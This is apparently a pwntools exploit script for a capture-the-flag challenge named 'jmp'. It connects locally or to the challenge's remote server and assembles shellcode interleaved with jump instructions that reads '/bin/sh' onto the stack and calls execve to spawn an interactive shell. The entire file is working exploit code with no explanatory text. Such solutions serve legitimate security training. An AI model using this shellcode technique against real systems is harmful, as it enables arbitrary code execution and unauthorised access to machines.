#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('../challenge/out')
context.terminal = ['tmux', 'splitw', '-h']


def conn():
    if args.REMOTE:
        return remote('jmp.ctf.ingeniums.club', 1337, ssl=True)
    else:
        return process(elf.path)
    

r = conn()


jmp = b'\xeb'
jmp_1 = jmp + b'\x01'
push_rsp = jmp + b'T'
jmp_4b = b'\xe9'
syscall = jmp_4b + b'\x0f\x05\xeb\x01'
push_0 = jmp_4b + b'j\x00\xeb\x03'
push_8 = jmp_4b + b'j\x08\xeb\x03'
push_59 = jmp_4b + b'j;\xeb\x03'
pop_rax = jmp + b'X'
pop_rsi = jmp + b'^'
pop_rdx = jmp + b'Z'
pop_rdi = jmp + b'_'


shellcode = jmp_1
shellcode += push_0
shellcode += jmp_1
shellcode += pop_rdi
shellcode += jmp_1
shellcode += push_0
shellcode += jmp_1
shellcode += push_0
shellcode += jmp_1
shellcode += push_8
shellcode += jmp_1
shellcode += pop_rdx
shellcode += jmp_1
shellcode += push_rsp
shellcode += jmp_1
shellcode += pop_rsi
shellcode += jmp_1
shellcode += syscall    # read /bin/sh top of the stack
shellcode += jmp_1

shellcode += push_rsp
shellcode += jmp_1
shellcode += pop_rdi
shellcode += jmp_1
shellcode += push_0
shellcode += jmp_1
shellcode += pop_rsi
shellcode += jmp_1
shellcode += push_0
shellcode += jmp_1
shellcode += pop_rdx
shellcode += jmp_1
shellcode += push_59
shellcode += jmp_1
shellcode += pop_rax
shellcode += jmp_1
shellcode += syscall    # execve /bin/sh
shellcode += jmp_1


# print(len(shellcode))



print(disasm(shellcode))
input('send>>')

gdb_script = """
    b *main+157
"""

# gdb.attach(r, gdbscript=gdb_script)
r.send(shellcode)

input('send /bin/sh>>')
r.sendline(b'/bin/sh\x00')

r.interactive()